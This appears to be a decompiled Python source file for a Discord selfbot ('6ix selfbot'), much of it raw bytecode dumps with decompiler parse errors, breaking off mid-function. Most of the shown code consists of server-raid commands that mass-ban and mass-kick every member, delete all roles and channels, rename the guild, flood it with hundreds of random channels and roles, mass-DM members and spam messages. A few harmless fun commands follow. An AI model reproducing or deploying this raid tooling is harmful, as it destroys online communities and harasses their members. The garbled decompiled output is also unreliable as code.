              104  GET_AWAITABLE    
              106  LOAD_CONST               None
              108  YIELD_FROM       
              110  POP_TOP          
              112  POP_BLOCK        
              114  JUMP_BACK            92  'to 92'
            116_0  COME_FROM_FINALLY    96  '96'

 L.1956       116  POP_TOP          
              118  POP_TOP          
              120  POP_TOP          

 L.1957       122  POP_EXCEPT       
              124  JUMP_BACK            92  'to 92'
              126  END_FINALLY      
              128  JUMP_BACK            92  'to 92'
            130_0  COME_FROM            92  '92'

 L.1958       130  LOAD_GLOBAL              list
              132  LOAD_FAST                'ctx'
              134  LOAD_ATTR                guild
              136  LOAD_ATTR                members
              138  CALL_FUNCTION_1       1  ''
              140  GET_ITER         
            142_0  COME_FROM           178  '178'
            142_1  COME_FROM           174  '174'
            142_2  COME_FROM           164  '164'
              142  FOR_ITER            180  'to 180'
              144  STORE_FAST               'user'

 L.1959       146  SETUP_FINALLY       166  'to 166'

 L.1960       148  LOAD_FAST                'user'
              150  LOAD_METHOD              ban
              152  CALL_METHOD_0         0  ''
              154  GET_AWAITABLE    
              156  LOAD_CONST               None
              158  YIELD_FROM       
              160  POP_TOP          
              162  POP_BLOCK        
              164  JUMP_BACK           142  'to 142'
            166_0  COME_FROM_FINALLY   146  '146'

 L.1961       166  POP_TOP          
              168  POP_TOP          
              170  POP_TOP          

 L.1962       172  POP_EXCEPT       
              174  JUMP_BACK           142  'to 142'
              176  END_FINALLY      
              178  JUMP_BACK           142  'to 142'
            180_0  COME_FROM           142  '142'

 L.1963       180  LOAD_GLOBAL              list
              182  LOAD_FAST                'ctx'
              184  LOAD_ATTR                guild
              186  LOAD_ATTR                members
              188  CALL_FUNCTION_1       1  ''
              190  GET_ITER         
            192_0  COME_FROM           228  '228'
            192_1  COME_FROM           224  '224'
            192_2  COME_FROM           214  '214'
              192  FOR_ITER            230  'to 230'
              194  STORE_FAST               'user'

 L.1964       196  SETUP_FINALLY       216  'to 216'

 L.1965       198  LOAD_FAST                'user'
              200  LOAD_METHOD              kick
              202  CALL_METHOD_0         0  ''
              204  GET_AWAITABLE    
              206  LOAD_CONST               None
              208  YIELD_FROM       
              210  POP_TOP          
              212  POP_BLOCK        
              214  JUMP_BACK           192  'to 192'
            216_0  COME_FROM_FINALLY   196  '196'

 L.1966       216  POP_TOP          
              218  POP_TOP          
              220  POP_TOP          

 L.1967       222  POP_EXCEPT       
              224  JUMP_BACK           192  'to 192'
              226  END_FINALLY      
              228  JUMP_BACK           192  'to 192'
            230_0  COME_FROM           192  '192'

 L.1968       230  LOAD_GLOBAL              list
              232  LOAD_FAST                'ctx'
              234  LOAD_ATTR                guild
              236  LOAD_ATTR                roles
              238  CALL_FUNCTION_1       1  ''
              240  GET_ITER         
            242_0  COME_FROM           278  '278'
            242_1  COME_FROM           274  '274'
            242_2  COME_FROM           264  '264'
              242  FOR_ITER            280  'to 280'
              244  STORE_FAST               'role'

 L.1969       246  SETUP_FINALLY       266  'to 266'

 L.1970       248  LOAD_FAST                'role'
              250  LOAD_METHOD              delete
              252  CALL_METHOD_0         0  ''
              254  GET_AWAITABLE    
              256  LOAD_CONST               None
              258  YIELD_FROM       
              260  POP_TOP          
              262  POP_BLOCK        
              264  JUMP_BACK           242  'to 242'
            266_0  COME_FROM_FINALLY   246  '246'

 L.1971       266  POP_TOP          
              268  POP_TOP          
              270  POP_TOP          

 L.1972       272  POP_EXCEPT       
              274  JUMP_BACK           242  'to 242'
              276  END_FINALLY      
              278  JUMP_BACK           242  'to 242'
            280_0  COME_FROM           242  '242'

 L.1973       280  SETUP_FINALLY       308  'to 308'

 L.1974       282  LOAD_FAST                'ctx'
              284  LOAD_ATTR                guild
              286  LOAD_ATTR                edit

 L.1975       288  LOAD_GLOBAL              RandString
              290  CALL_FUNCTION_0       0  ''

 L.1974       292  LOAD_CONST               ('name',)
              294  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              296  GET_AWAITABLE    
              298  LOAD_CONST               None
              300  YIELD_FROM       
              302  POP_TOP          
              304  POP_BLOCK        
              306  JUMP_FORWARD        320  'to 320'
            308_0  COME_FROM_FINALLY   280  '280'

 L.1977       308  POP_TOP          
              310  POP_TOP          
              312  POP_TOP          

 L.1978       314  POP_EXCEPT       
              316  JUMP_FORWARD        320  'to 320'
              318  END_FINALLY      
            320_0  COME_FROM           316  '316'
            320_1  COME_FROM           306  '306'

 L.1979       320  LOAD_GLOBAL              range
              322  LOAD_CONST               500
              324  CALL_FUNCTION_1       1  ''
              326  GET_ITER         
            328_0  COME_FROM           398  '398'
              328  FOR_ITER            402  'to 402'
              330  STORE_FAST               '_i'

 L.1980       332  LOAD_FAST                'ctx'
              334  LOAD_ATTR                guild
              336  LOAD_ATTR                create_text_channel
              338  LOAD_GLOBAL              RandString
              340  CALL_FUNCTION_0       0  ''
              342  LOAD_CONST               ('name',)
              344  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              346  GET_AWAITABLE    
              348  LOAD_CONST               None
              350  YIELD_FROM       
              352  POP_TOP          

 L.1981       354  LOAD_FAST                'ctx'
              356  LOAD_ATTR                guild
              358  LOAD_ATTR                create_category
              360  LOAD_GLOBAL              RandString
              362  CALL_FUNCTION_0       0  ''
              364  LOAD_CONST               ('name',)
              366  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              368  GET_AWAITABLE    
              370  LOAD_CONST               None
              372  YIELD_FROM       
              374  POP_TOP          

 L.1982       376  LOAD_FAST                'ctx'
              378  LOAD_ATTR                guild
              380  LOAD_ATTR                create_voice_channel
              382  LOAD_GLOBAL              RandString
              384  CALL_FUNCTION_0       0  ''
              386  LOAD_CONST               ('name',)
              388  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              390  GET_AWAITABLE    
              392  LOAD_CONST               None
              394  YIELD_FROM       
              396  POP_TOP          
          398_400  JUMP_BACK           328  'to 328'
            402_0  COME_FROM           328  '328'

Parse error at or near `JUMP_BACK' instruction at offset 124


@SIX.command()
async def dmall--- This code section failed: ---

 L.1987         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1988        16  LOAD_GLOBAL              list
               18  LOAD_FAST                'ctx'
               20  LOAD_ATTR                guild
               22  LOAD_ATTR                members
               24  CALL_FUNCTION_1       1  ''
               26  GET_ITER         
             28_0  COME_FROM            82  '82'
             28_1  COME_FROM            78  '78'
             28_2  COME_FROM            68  '68'
               28  FOR_ITER             84  'to 84'
               30  STORE_FAST               'user'

 L.1989        32  SETUP_FINALLY        70  'to 70'

 L.1990        34  LOAD_GLOBAL              asyncio
               36  LOAD_METHOD              sleep
               38  LOAD_CONST               5
               40  CALL_METHOD_1         1  ''
               42  GET_AWAITABLE    
               44  LOAD_CONST               None
               46  YIELD_FROM       
               48  POP_TOP          

 L.1991        50  LOAD_FAST                'user'
               52  LOAD_METHOD              send
               54  LOAD_FAST                'message'
               56  CALL_METHOD_1         1  ''
               58  GET_AWAITABLE    
               60  LOAD_CONST               None
               62  YIELD_FROM       
               64  POP_TOP          
               66  POP_BLOCK        
               68  JUMP_BACK            28  'to 28'
             70_0  COME_FROM_FINALLY    32  '32'

 L.1992        70  POP_TOP          
               72  POP_TOP          
               74  POP_TOP          

 L.1993        76  POP_EXCEPT       
               78  JUMP_BACK            28  'to 28'
               80  END_FINALLY      
               82  JUMP_BACK            28  'to 28'
             84_0  COME_FROM            28  '28'

Parse error at or near `JUMP_BACK' instruction at offset 78


@SIX.command()
async def massB--- This code section failed: ---

 L.1997         0  LOAD_CONST               -1
                2  STORE_FAST               'tit'

 L.1998         4  LOAD_FAST                'ctx'
                6  LOAD_ATTR                message
                8  LOAD_METHOD              delete
               10  CALL_METHOD_0         0  ''
               12  GET_AWAITABLE    
               14  LOAD_CONST               None
               16  YIELD_FROM       
               18  POP_TOP          

 L.1999        20  LOAD_GLOBAL              discord
               22  LOAD_ATTR                Embed
               24  LOAD_STR                 'mass banning'
               26  LOAD_STR                 ''
               28  LOAD_CONST               0
               30  LOAD_CONST               ('title', 'description', 'color')
               32  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               34  STORE_FAST               'em'

 L.2000        36  LOAD_FAST                'em'
               38  LOAD_ATTR                set_image
               40  LOAD_STR                 'https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128'
               42  LOAD_CONST               ('url',)
               44  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               46  POP_TOP          

 L.2001        48  LOAD_FAST                'em'
               50  LOAD_ATTR                set_footer
               52  LOAD_STR                 '6ix selfbot'
               54  LOAD_FAST                'ctx'
               56  LOAD_ATTR                author
               58  LOAD_ATTR                avatar_url
               60  LOAD_CONST               ('text', 'icon_url')
               62  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               64  POP_TOP          

 L.2002        66  LOAD_FAST                'ctx'
               68  LOAD_ATTR                send
               70  LOAD_FAST                'em'
               72  LOAD_CONST               ('embed',)
               74  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               76  GET_AWAITABLE    
               78  LOAD_CONST               None
               80  YIELD_FROM       
               82  POP_TOP          

 L.2003        84  LOAD_FAST                'ctx'
               86  LOAD_ATTR                guild
               88  LOAD_ATTR                members
               90  GET_ITER         
             92_0  COME_FROM           140  '140'
             92_1  COME_FROM           136  '136'
             92_2  COME_FROM           132  '132'
             92_3  COME_FROM           122  '122'
               92  FOR_ITER            142  'to 142'
               94  STORE_FAST               'member'

 L.2004        96  SETUP_FINALLY       124  'to 124'

 L.2005        98  LOAD_FAST                'tit'
              100  LOAD_CONST               1
              102  INPLACE_ADD      
              104  STORE_FAST               'tit'

 L.2006       106  LOAD_FAST                'member'
              108  LOAD_METHOD              ban
              110  CALL_METHOD_0         0  ''
              112  GET_AWAITABLE    
              114  LOAD_CONST               None
              116  YIELD_FROM       
              118  POP_TOP          
              120  POP_BLOCK        
              122  JUMP_BACK            92  'to 92'
            124_0  COME_FROM_FINALLY    96  '96'

 L.2007       124  POP_TOP          
              126  POP_TOP          
              128  POP_TOP          

 L.2008       130  POP_EXCEPT       
              132  JUMP_BACK            92  'to 92'
              134  POP_EXCEPT       
              136  JUMP_BACK            92  'to 92'
              138  END_FINALLY      
              140  JUMP_BACK            92  'to 92'
            142_0  COME_FROM            92  '92'

Parse error at or near `JUMP_BACK' instruction at offset 132


@SIX.command
async def massK--- This code section failed: ---

 L.2012         0  LOAD_CONST               -1
                2  STORE_FAST               'gog'

 L.2013         4  LOAD_FAST                'ctx'
                6  LOAD_ATTR                message
                8  LOAD_METHOD              delete
               10  CALL_METHOD_0         0  ''
               12  GET_AWAITABLE    
               14  LOAD_CONST               None
               16  YIELD_FROM       
               18  POP_TOP          

 L.2014        20  LOAD_GLOBAL              discord
               22  LOAD_ATTR                Embed
               24  LOAD_STR                 'mass kicking'
               26  LOAD_STR                 ''
               28  LOAD_CONST               0
               30  LOAD_CONST               ('title', 'description', 'color')
               32  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               34  STORE_FAST               'em'

 L.2015        36  LOAD_FAST                'em'
               38  LOAD_ATTR                set_image
               40  LOAD_STR                 'https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128'
               42  LOAD_CONST               ('url',)
               44  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               46  POP_TOP          

 L.2016        48  LOAD_FAST                'em'
               50  LOAD_ATTR                set_footer
               52  LOAD_STR                 '6ix selfbot'
               54  LOAD_FAST                'ctx'
               56  LOAD_ATTR                author
               58  LOAD_ATTR                avatar_url
               60  LOAD_CONST               ('text', 'icon_url')
               62  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               64  POP_TOP          

 L.2017        66  LOAD_FAST                'ctx'
               68  LOAD_ATTR                send
               70  LOAD_FAST                'em'
               72  LOAD_CONST               ('embed',)
               74  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               76  GET_AWAITABLE    
               78  LOAD_CONST               None
               80  YIELD_FROM       
               82  POP_TOP          

 L.2018        84  LOAD_FAST                'ctx'
               86  LOAD_ATTR                guild
               88  LOAD_ATTR                members
               90  GET_ITER         
             92_0  COME_FROM           140  '140'
             92_1  COME_FROM           136  '136'
             92_2  COME_FROM           132  '132'
             92_3  COME_FROM           122  '122'
               92  FOR_ITER            142  'to 142'
               94  STORE_FAST               'member'

 L.2019        96  SETUP_FINALLY       124  'to 124'

 L.2020        98  LOAD_FAST                'gog'
              100  LOAD_CONST               1
              102  INPLACE_ADD      
              104  STORE_FAST               'gog'

 L.2021       106  LOAD_FAST                'member'
              108  LOAD_METHOD              kick
              110  CALL_METHOD_0         0  ''
              112  GET_AWAITABLE    
              114  LOAD_CONST               None
              116  YIELD_FROM       
              118  POP_TOP          
              120  POP_BLOCK        
              122  JUMP_BACK            92  'to 92'
            124_0  COME_FROM_FINALLY    96  '96'

 L.2022       124  POP_TOP          
              126  POP_TOP          
              128  POP_TOP          

 L.2023       130  POP_EXCEPT       
              132  JUMP_BACK            92  'to 92'
              134  POP_EXCEPT       
              136  JUMP_BACK            92  'to 92'
              138  END_FINALLY      
              140  JUMP_BACK            92  'to 92'
            142_0  COME_FROM            92  '92'

Parse error at or near `JUMP_BACK' instruction at offset 132


@SIX.command()
async def massR--- This code section failed: ---

 L.2027         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.2028        16  LOAD_GLOBAL              discord
               18  LOAD_ATTR                Embed
               20  LOAD_STR                 'mass roles'
               22  LOAD_STR                 ''
               24  LOAD_CONST               0
               26  LOAD_CONST               ('title', 'description', 'color')
               28  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               30  STORE_FAST               'em'

 L.2029        32  LOAD_FAST                'em'
               34  LOAD_ATTR                set_image
               36  LOAD_STR                 'https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128'
               38  LOAD_CONST               ('url',)
               40  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               42  POP_TOP          

 L.2030        44  LOAD_FAST                'em'
               46  LOAD_ATTR                set_footer
               48  LOAD_STR                 '6ix selfbot'
               50  LOAD_FAST                'ctx'
               52  LOAD_ATTR                author
               54  LOAD_ATTR                avatar_url
               56  LOAD_CONST               ('text', 'icon_url')
               58  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               60  POP_TOP          

 L.2031        62  LOAD_FAST                'ctx'
               64  LOAD_ATTR                send
               66  LOAD_FAST                'em'
               68  LOAD_CONST               ('embed',)
               70  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               72  GET_AWAITABLE    
               74  LOAD_CONST               None
               76  YIELD_FROM       
               78  POP_TOP          

 L.2032        80  LOAD_GLOBAL              range
               82  LOAD_CONST               900
               84  CALL_FUNCTION_1       1  ''
               86  GET_ITER         
             88_0  COME_FROM           140  '140'
             88_1  COME_FROM           122  '122'
               88  FOR_ITER            142  'to 142'
               90  STORE_FAST               '_i'

 L.2033        92  SETUP_FINALLY       124  'to 124'

 L.2034        94  LOAD_FAST                'ctx'
               96  LOAD_ATTR                guild
               98  LOAD_ATTR                create_role
              100  LOAD_GLOBAL              RandString
              102  CALL_FUNCTION_0       0  ''
              104  LOAD_GLOBAL              RandomColor
              106  CALL_FUNCTION_0       0  ''
              108  LOAD_CONST               ('name', 'color')
              110  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              112  GET_AWAITABLE    
              114  LOAD_CONST               None
              116  YIELD_FROM       
              118  POP_TOP          
              120  POP_BLOCK        
              122  JUMP_BACK            88  'to 88'
            124_0  COME_FROM_FINALLY    92  '92'

 L.2035       124  POP_TOP          
              126  POP_TOP          
              128  POP_TOP          

 L.2036       130  POP_EXCEPT       
              132  POP_TOP          
              134  LOAD_CONST               None
              136  RETURN_VALUE     
              138  END_FINALLY      
              140  JUMP_BACK            88  'to 88'
            142_0  COME_FROM            88  '88'

Parse error at or near `POP_TOP' instruction at offset 132


@SIX.command()
async def massC--- This code section failed: ---

 L.2040         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.2041        16  LOAD_GLOBAL              discord
               18  LOAD_ATTR                Embed
               20  LOAD_STR                 'mass channels'
               22  LOAD_STR                 ''
               24  LOAD_CONST               0
               26  LOAD_CONST               ('title', 'description', 'color')
               28  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               30  STORE_FAST               'em'

 L.2042        32  LOAD_FAST                'em'
               34  LOAD_ATTR                set_image
               36  LOAD_STR                 'https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128'
               38  LOAD_CONST               ('url',)
               40  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               42  POP_TOP          

 L.2043        44  LOAD_FAST                'em'
               46  LOAD_ATTR                set_footer
               48  LOAD_STR                 '6ix selfbot'
               50  LOAD_FAST                'ctx'
               52  LOAD_ATTR                author
               54  LOAD_ATTR                avatar_url
               56  LOAD_CONST               ('text', 'icon_url')
               58  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               60  POP_TOP          

 L.2044        62  LOAD_FAST                'ctx'
               64  LOAD_ATTR                send
               66  LOAD_FAST                'em'
               68  LOAD_CONST               ('embed',)
               70  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               72  GET_AWAITABLE    
               74  LOAD_CONST               None
               76  YIELD_FROM       
               78  POP_TOP          

 L.2045        80  LOAD_GLOBAL              range
               82  LOAD_CONST               900
               84  CALL_FUNCTION_1       1  ''
               86  GET_ITER         
             88_0  COME_FROM           136  '136'
             88_1  COME_FROM           118  '118'
               88  FOR_ITER            138  'to 138'
               90  STORE_FAST               '_i'

 L.2046        92  SETUP_FINALLY       120  'to 120'

 L.2047        94  LOAD_FAST                'ctx'
               96  LOAD_ATTR                guild
               98  LOAD_ATTR                create_text_channel
              100  LOAD_GLOBAL              RandString
              102  CALL_FUNCTION_0       0  ''
              104  LOAD_CONST               ('name',)
              106  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              108  GET_AWAITABLE    
              110  LOAD_CONST               None
              112  YIELD_FROM       
              114  POP_TOP          
              116  POP_BLOCK        
              118  JUMP_BACK            88  'to 88'
            120_0  COME_FROM_FINALLY    92  '92'

 L.2048       120  POP_TOP          
              122  POP_TOP          
              124  POP_TOP          

 L.2049       126  POP_EXCEPT       
              128  POP_TOP          
              130  LOAD_CONST               None
              132  RETURN_VALUE     
              134  END_FINALLY      
              136  JUMP_BACK            88  'to 88'
            138_0  COME_FROM            88  '88'

Parse error at or near `POP_TOP' instruction at offset 128


@SIX.command()
async def delC--- This code section failed: ---

 L.2053         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.2054        16  LOAD_GLOBAL              discord
               18  LOAD_ATTR                Embed
               20  LOAD_STR                 'deleting channels'
               22  LOAD_STR                 ''
               24  LOAD_CONST               0
               26  LOAD_CONST               ('title', 'description', 'color')
               28  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               30  STORE_FAST               'em'

 L.2055        32  LOAD_FAST                'em'
               34  LOAD_ATTR                set_image
               36  LOAD_STR                 'https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128'
               38  LOAD_CONST               ('url',)
               40  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               42  POP_TOP          

 L.2056        44  LOAD_FAST                'em'
               46  LOAD_ATTR                set_footer
               48  LOAD_STR                 '6ix selfbot'
               50  LOAD_FAST                'ctx'
               52  LOAD_ATTR                author
               54  LOAD_ATTR                avatar_url
               56  LOAD_CONST               ('text', 'icon_url')
               58  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               60  POP_TOP          

 L.2057        62  LOAD_FAST                'ctx'
               64  LOAD_ATTR                send
               66  LOAD_FAST                'em'
               68  LOAD_CONST               ('embed',)
               70  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               72  GET_AWAITABLE    
               74  LOAD_CONST               None
               76  YIELD_FROM       
               78  POP_TOP          

 L.2058        80  LOAD_GLOBAL              list
               82  LOAD_FAST                'ctx'
               84  LOAD_ATTR                guild
               86  LOAD_ATTR                channels
               88  CALL_FUNCTION_1       1  ''
               90  GET_ITER         
             92_0  COME_FROM           132  '132'
             92_1  COME_FROM           114  '114'
               92  FOR_ITER            134  'to 134'
               94  STORE_FAST               'channel'

 L.2059        96  SETUP_FINALLY       116  'to 116'

 L.2060        98  LOAD_FAST                'channel'
              100  LOAD_METHOD              delete
              102  CALL_METHOD_0         0  ''
              104  GET_AWAITABLE    
              106  LOAD_CONST               None
              108  YIELD_FROM       
              110  POP_TOP          
              112  POP_BLOCK        
              114  JUMP_BACK            92  'to 92'
            116_0  COME_FROM_FINALLY    96  '96'

 L.2061       116  POP_TOP          
              118  POP_TOP          
              120  POP_TOP          

 L.2062       122  POP_EXCEPT       
              124  POP_TOP          
              126  LOAD_CONST               None
              128  RETURN_VALUE     
              130  END_FINALLY      
              132  JUMP_BACK            92  'to 92'
            134_0  COME_FROM            92  '92'

Parse error at or near `POP_TOP' instruction at offset 124


@SIX.command()
async def delR--- This code section failed: ---

 L.2066         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.2067        16  LOAD_GLOBAL              discord
               18  LOAD_ATTR                Embed
               20  LOAD_STR                 'deleting roles'
               22  LOAD_STR                 ''
               24  LOAD_CONST               0
               26  LOAD_CONST               ('title', 'description', 'color')
               28  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               30  STORE_FAST               'em'

 L.2068        32  LOAD_FAST                'em'
               34  LOAD_ATTR                set_image
               36  LOAD_STR                 'https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128'
               38  LOAD_CONST               ('url',)
               40  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               42  POP_TOP          

 L.2069        44  LOAD_FAST                'em'
               46  LOAD_ATTR                set_footer
               48  LOAD_STR                 '6ix selfbot'
               50  LOAD_FAST                'ctx'
               52  LOAD_ATTR                author
               54  LOAD_ATTR                avatar_url
               56  LOAD_CONST               ('text', 'icon_url')
               58  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               60  POP_TOP          

 L.2070        62  LOAD_FAST                'ctx'
               64  LOAD_ATTR                send
               66  LOAD_FAST                'em'
               68  LOAD_CONST               ('embed',)
               70  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               72  GET_AWAITABLE    
               74  LOAD_CONST               None
               76  YIELD_FROM       
               78  POP_TOP          

 L.2071        80  LOAD_GLOBAL              list
               82  LOAD_FAST                'ctx'
               84  LOAD_ATTR                guild
               86  LOAD_ATTR                roles
               88  CALL_FUNCTION_1       1  ''
               90  GET_ITER         
             92_0  COME_FROM           128  '128'
             92_1  COME_FROM           124  '124'
             92_2  COME_FROM           114  '114'
               92  FOR_ITER            130  'to 130'
               94  STORE_FAST               'role'

 L.2072        96  SETUP_FINALLY       116  'to 116'

 L.2073        98  LOAD_FAST                'role'
              100  LOAD_METHOD              delete
              102  CALL_METHOD_0         0  ''
              104  GET_AWAITABLE    
              106  LOAD_CONST               None
              108  YIELD_FROM       
              110  POP_TOP          
              112  POP_BLOCK        
              114  JUMP_BACK            92  'to 92'
            116_0  COME_FROM_FINALLY    96  '96'

 L.2074       116  POP_TOP          
              118  POP_TOP          
              120  POP_TOP          

 L.2075       122  POP_EXCEPT       
              124  JUMP_BACK            92  'to 92'
              126  END_FINALLY      
              128  JUMP_BACK            92  'to 92'
            130_0  COME_FROM            92  '92'

Parse error at or near `JUMP_BACK' instruction at offset 124


@SIX.command()
async def massUn--- This code section failed: ---

 L.2079         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.2080        16  LOAD_GLOBAL              discord
               18  LOAD_ATTR                Embed
               20  LOAD_STR                 'mass unbanning'
               22  LOAD_STR                 ''
               24  LOAD_CONST               0
               26  LOAD_CONST               ('title', 'description', 'color')
               28  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               30  STORE_FAST               'em'

 L.2081        32  LOAD_FAST                'em'
               34  LOAD_ATTR                set_image
               36  LOAD_STR                 'https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128'
               38  LOAD_CONST               ('url',)
               40  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               42  POP_TOP          

 L.2082        44  LOAD_FAST                'em'
               46  LOAD_ATTR                set_footer
               48  LOAD_STR                 '6ix selfbot'
               50  LOAD_FAST                'ctx'
               52  LOAD_ATTR                author
               54  LOAD_ATTR                avatar_url
               56  LOAD_CONST               ('text', 'icon_url')
               58  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               60  POP_TOP          

 L.2083        62  LOAD_FAST                'ctx'
               64  LOAD_ATTR                guild
               66  LOAD_METHOD              bans
               68  CALL_METHOD_0         0  ''
               70  GET_AWAITABLE    
               72  LOAD_CONST               None
               74  YIELD_FROM       
               76  STORE_FAST               'banlist'

 L.2084        78  LOAD_FAST                'banlist'
               80  GET_ITER         
             82_0  COME_FROM           142  '142'
             82_1  COME_FROM           138  '138'
             82_2  COME_FROM           128  '128'
               82  FOR_ITER            144  'to 144'
               84  STORE_FAST               'users'

 L.2085        86  SETUP_FINALLY       130  'to 130'

 L.2086        88  LOAD_GLOBAL              asyncio
               90  LOAD_METHOD              sleep
               92  LOAD_CONST               2
               94  CALL_METHOD_1         1  ''
               96  GET_AWAITABLE    
               98  LOAD_CONST               None
              100  YIELD_FROM       
              102  POP_TOP          

 L.2087       104  LOAD_FAST                'ctx'
              106  LOAD_ATTR                guild
              108  LOAD_ATTR                unban
              110  LOAD_FAST                'users'
              112  LOAD_ATTR                user
              114  LOAD_CONST               ('user',)
              116  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              118  GET_AWAITABLE    
              120  LOAD_CONST               None
              122  YIELD_FROM       
              124  POP_TOP          
              126  POP_BLOCK        
              128  JUMP_BACK            82  'to 82'
            130_0  COME_FROM_FINALLY    86  '86'

 L.2088       130  POP_TOP          
              132  POP_TOP          
              134  POP_TOP          

 L.2089       136  POP_EXCEPT       
              138  JUMP_BACK            82  'to 82'
              140  END_FINALLY      
              142  JUMP_BACK            82  'to 82'
            144_0  COME_FROM            82  '82'

Parse error at or near `JUMP_BACK' instruction at offset 138


@SIX.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)


@SIX.command()
async def dm(ctx, user: discord.Member, *, message):
    await ctx.message.delete()
    user = SIX.get_user(user.id)
    if ctx.author.id == SIX.user.id:
        return
    try:
        await user.send(message)
    except:
        pass


@SIX.command(name='get-color', aliases=['color', 'colour', 'sc'])
async def _get_color(ctx, *, color: discord.Colour):
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f"Showing Color: {str(color)}")
    em.set_image(url='attachment://color.png')
    await ctx.send(file=(discord.File(file, 'color.png')), embed=em)


@SIX.command()
async def tinyurl(ctx, *, link):
    await ctx.message.delete()
    r = requests.get(f"http://tinyurl.com/api-create.php?url={link}").text
    em = discord.Embed(color=(discord.Color(random.randint(0, 16777215))))
    em.add_field(name='Shortened link', value=r, inline=False)
    await ctx.send(embed=em)


@SIX.command(aliases=['rainbow-role'])
async def rainbow(ctx, *, role):
    await ctx.message.delete()
    role = discord.utils.get((ctx.guild.roles), name=role)
    while True:
        try:
            await role.edit(role=role, colour=(RandomColor()))
            await asyncio.sleep(10)
        except:
            pass


@SIX.command(name='8ball')
async def _ball(ctx, *, question):
    await ctx.message.delete()
    responses = [
     'That is a resounding no',
     'It is not looking likely',
     'Too hard to tell',
     'It is quite possible',
     'That is a definite yes!',
     'Maybe',
     'There is a good chance']
    answer = random.choice(responses)
    embed = discord.Embed(color=(discord.Color(random.randint(0, 16777215))))
    embed.add_field(name='Question', value=question, inline=False)
    embed.add_field(name='Answer', value=answer, inline=False)
    embed.set_thumbnail(url='https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png')
    embed.set_footer(text=(datetime.datetime.now()))
    await ctx.send(embed=embed)


@SIX.command(aliases=['slots', 'bet'])
async def slot(ctx):
    await ctx.message.delete()
    emojis = '🍎🍊🍐🍋🍉🍇🍓🍒'
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
